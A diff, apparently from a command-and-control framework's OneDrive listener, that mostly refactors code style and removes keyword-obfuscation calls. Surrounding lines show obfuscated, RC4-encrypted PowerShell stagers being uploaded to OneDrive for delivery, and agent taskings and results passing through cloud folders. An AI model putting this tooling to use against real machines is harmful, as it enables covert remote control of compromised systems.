@@ -280,20 +280,19 @@ class Listener:
                     launcher,
                     obfuscation_command=obfuscation_command,
                 )
-                launcher = self.mainMenu.obfuscationv2.obfuscate_keywords(launcher)
 
             if encode and (
                 (not obfuscate) or ("launcher" not in obfuscation_command.lower())
             ):
                 return helpers.powershell_launcher(launcher, launcher_cmd)
-            else:
-                return launcher
+            return launcher
 
         if language.startswith("pyth"):
             log.error(
                 "listeners/onedrive generate_launcher(): Python agent not implemented yet"
             )
             return "Python not implemented yet"
+        return None
 
     def generate_stager(
         self,
@@ -357,21 +356,19 @@ class Listener:
                 stager = self.mainMenu.obfuscationv2.obfuscate(
                     stager, obfuscation_command=obfuscation_command
                 )
-                stager = self.mainMenu.obfuscationv2.obfuscate_keywords(stager)
 
             if encode:
                 return helpers.enc_powershell(stager)
-            elif encrypt:
+            if encrypt:
                 RC4IV = os.urandom(4)
                 staging_key = staging_key.encode("UTF-8")
                 return RC4IV + encryption.rc4(
                     RC4IV + staging_key, stager.encode("UTF-8")
                 )
-            else:
-                return stager
+            return stager
 
-        else:
-            log.error("Python agent not available for Onedrive")
+        log.error("Python agent not available for Onedrive")
+        return None
 
     def generate_comms(
         self,
@@ -386,36 +383,36 @@ class Listener:
         redirect_uri = listener_options["RedirectURI"]["Value"]
         taskings_folder = listener_options["TaskingsFolder"]["Value"]
 
-        if language:
-            if language.lower() == "powershell":
-                template_path = [
-                    os.path.join(self.mainMenu.installPath, "/data/agent/stagers"),
-                    os.path.join(self.mainMenu.installPath, "./data/agent/stagers"),
-                ]
-
-                eng = templating.TemplateEngine(template_path)
-                template = eng.get_template("onedrive/comms.ps1")
-
-                template_options = {
-                    "token:": self.token,
-                    "refresh_token": refresh_token,
-                    "client_id": client_id,
-                    "client_secret": client_secret,
-                    "redirect_uri": redirect_uri,
-                    "base_folder": base_folder,
-                    "results_folder": results_folder,
-                    "taskings_folder": taskings_folder,
-                }
-
-                comms = template.render(template_options)
-                return comms
-
-            else:
-                log.error(
-                    "listeners/onedrive generate_comms(): invalid language specification, only 'powershell' is currently supported for this module."
-                )
-        else:
+        if not language:
             log.error("listeners/onedrive generate_comms(): no language specified!")
+            return None
+
+        if language.lower() == "powershell":
+            template_path = [
+                os.path.join(self.mainMenu.installPath, "/data/agent/stagers"),
+                os.path.join(self.mainMenu.installPath, "./data/agent/stagers"),
+            ]
+
+            eng = templating.TemplateEngine(template_path)
+            template = eng.get_template("onedrive/comms.ps1")
+
+            template_options = {
+                "token:": self.token,
+                "refresh_token": refresh_token,
+                "client_id": client_id,
+                "client_secret": client_secret,
+                "redirect_uri": redirect_uri,
+                "base_folder": base_folder,
+                "results_folder": results_folder,
+                "taskings_folder": taskings_folder,
+            }
+
+            return template.render(template_options)
+
+        log.error(
+            "listeners/onedrive generate_comms(): invalid language specification, only 'powershell' is currently supported for this module."
+        )
+        return None
 
     def generate_agent(
         self,
@@ -431,7 +428,7 @@ class Listener:
 
         if not language:
             log.error("listeners/onedrive generate_agent(): No language specified")
-            return
+            return None
 
         language = language.lower()
         delay = listener_options["DefaultDelay"]["Value"]
@@ -470,9 +467,9 @@ class Listener:
                 agent_code = self.mainMenu.obfuscationv2.obfuscate(
                     agent_code, obfuscation_command=obfuscation_command
                 )
-                agent_code = self.mainMenu.obfuscationv2.obfuscate_keywords(agent_code)
 
             return agent_code
+        return None
 
     def start_server(self, listenerOptions):
         self.instance_log = log_util.get_listener_logger(
@@ -534,7 +531,7 @@ class Listener:
             headers = s.headers.copy()
             headers["Authorization"] = "Bearer " + token
 
-            request = s.get("%s/drive" % base_url, headers=headers)
+            request = s.get(f"{base_url}/drive", headers=headers)
 
             return request.ok
 
@@ -553,7 +550,7 @@ class Listener:
                     "name": base_folder,
                 }
                 base_object = s.post(
-                    "%s/drive/items/root/children" % base_url, json=params
+                    f"{base_url}/drive/items/root/children", json=params
                 )
             else:
                 message = f"{listener_name}: {base_folder} folder already exists"
@@ -600,7 +597,7 @@ class Listener:
                 headers={"Content-Type": "text/plain"},
             )
 
-            if r.status_code == 201 or r.status_code == 200:
+            if r.status_code in (201, 200):
                 item = r.json()
                 r = s.post(
                     "{}/drive/items/{}/createLink".format(base_url, item["id"]),
@@ -608,8 +605,9 @@ class Listener:
                     headers={"Content-Type": "application/json"},
                 )
                 _launcher_url = (
-                    "https://api.onedrive.com/v1.0/shares/%s/driveitem/content"
-                    % r.json()["shareId"]
+                    "https://api.onedrive.com/v1.0/shares/{}/driveitem/content".format(
+                        r.json()["shareId"]
+                    )
                 )
 
         def upload_stager():
@@ -625,7 +623,7 @@ class Listener:
                 data=ps_stager,
                 headers={"Content-Type": "application/octet-stream"},
             )
-            if r.status_code == 201 or r.status_code == 200:
+            if r.status_code in (201, 200):
                 item = r.json()
                 r = s.post(
                     "{}/drive/items/{}/createLink".format(base_url, item["id"]),
@@ -633,8 +631,9 @@ class Listener:
                     headers={"Content-Type": "application/json"},
                 )
                 stager_url = (
-                    "https://api.onedrive.com/v1.0/shares/%s/driveitem/content"
-                    % r.json()["shareId"]
+                    "https://api.onedrive.com/v1.0/shares/{}/driveitem/content".format(
+                        r.json()["shareId"]
+                    )
                 )
                 # Different domain for some reason?
                 self.stager_url = stager_url
@@ -688,7 +687,7 @@ class Listener:
                     upload_stager()
                     upload_launcher()
                     break
-                else:
+                else:  # noqa: RET508
                     time.sleep(1)
             except AttributeError:
                 time.sleep(1)
@@ -717,9 +716,7 @@ class Listener:
                     self.token["update"] = False
 
                 search = s.get(
-                    "{}/drive/root:/{}/{}?expand=children".format(
-                        base_url, base_folder, staging_folder
-                    )
+                    f"{base_url}/drive/root:/{base_folder}/{staging_folder}?expand=children"
                 )
                 for item in search.json()[
                     "children"
@@ -741,9 +738,7 @@ class Listener:
                             message = f"{listener_name}: Uploading {base_folder}/{staging_folder}/{agent_name}_2.txt, {len(return_val)!s} bytes"
                             self.instance_log.info(message)
                             s.put(
-                                "{}/drive/root:/{}/{}/{}_2.txt:/content".format(
-                                    base_url, base_folder, staging_folder, agent_name
-                                ),
+                                f"{base_url}/drive/root:/{base_folder}/{staging_folder}/{agent_name}_2.txt:/content",
                                 data=return_val,
                             )
                             message = f"{listener_name} Deleting {base_folder}/{staging_folder}/{item['name']}"
@@ -785,9 +780,7 @@ class Listener:
                             message = f"{listener_name}: Uploading {base_folder}/{staging_folder}/{agent_name}_4.txt, {len(enc_code)!s} bytes"
                             self.instance_log.info(message)
                             s.put(
-                                "{}/drive/root:/{}/{}/{}_4.txt:/content".format(
-                                    base_url, base_folder, staging_folder, agent_name
-                                ),
+                                f"{base_url}/drive/root:/{base_folder}/{staging_folder}/{agent_name}_4.txt:/content",
                                 data=enc_code,
                             )
                             message = f"{listener_name}: Deleting {base_folder}/{staging_folder}/{item['name']}"
@@ -809,9 +802,7 @@ class Listener:
                     if task_data:
                         try:
                             r = s.get(
-                                "{}/drive/root:/{}/{}/{}.txt:/content".format(
-                                    base_url, base_folder, taskings_folder, agent_id
-                                )
+                                f"{base_url}/drive/root:/{base_folder}/{taskings_folder}/{agent_id}.txt:/content"
                             )
                             if (
                                 r.status_code == 200
@@ -822,9 +813,7 @@ class Listener:
                             self.instance_log.info(message)
 
                             r = s.put(
-                                "{}/drive/root:/{}/{}/{}.txt:/content".format(
-                                    base_url, base_folder, taskings_folder, agent_id
-                                ),
+                                f"{base_url}/drive/root:/{base_folder}/{taskings_folder}/{agent_id}.txt:/content",
                                 data=task_data,
                             )
                         except Exception as e:
@@ -832,9 +821,7 @@ class Listener:
                             self.instance_log.error(message, exc_info=True)
 
                 search = s.get(
-                    "{}/drive/root:/{}/{}?expand=children".format(
-                        base_url, base_folder, results_folder
-                    )
+                    f"{base_url}/drive/root:/{base_folder}/{results_folder}?expand=children"
                 )
                 for item in search.json()[
                     "children"
@@ -849,9 +836,7 @@ class Listener:
                                 f"{listener_name}: Invalid agent, deleting {results_folder}/{item['name']} and restaging"
                             )
                             s.put(
-                                "{}/drive/root:/{}/{}/{}.txt:/content".format(
-                                    base_url, base_folder, taskings_folder, agent_id
-                                ),
+                                f"{base_url}/drive/root:/{base_folder}/{taskings_folder}/{agent_id}.txt:/content",
                                 data="RESTAGE",
                             )
                             s.delete("{}/drive/items/{}".format(base_url, item["id"]))
